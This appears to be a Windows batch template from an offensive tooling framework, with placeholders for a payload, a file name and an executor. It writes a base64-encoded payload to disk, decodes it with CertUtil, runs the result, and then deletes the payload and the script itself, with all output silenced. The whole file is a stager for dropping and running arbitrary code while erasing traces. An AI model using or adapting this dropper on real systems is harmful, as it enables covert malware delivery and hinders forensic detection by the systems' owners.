@echo off

#for @line in @payload:
ECHO @{line} >> "@{file_name}.b64"
#end

CertUtil -decode "@{file_name}.b64" "@{file_name}" >NUL 2>NUL
DEL /Q "@{file_name}.b64" >NUL 2>NUL

@!{executor}@{file_name}@!{additional_args}

DEL /Q "@{file_name}" >NUL 2>NUL
DEL /Q "%~f0" >NUL 2>NUL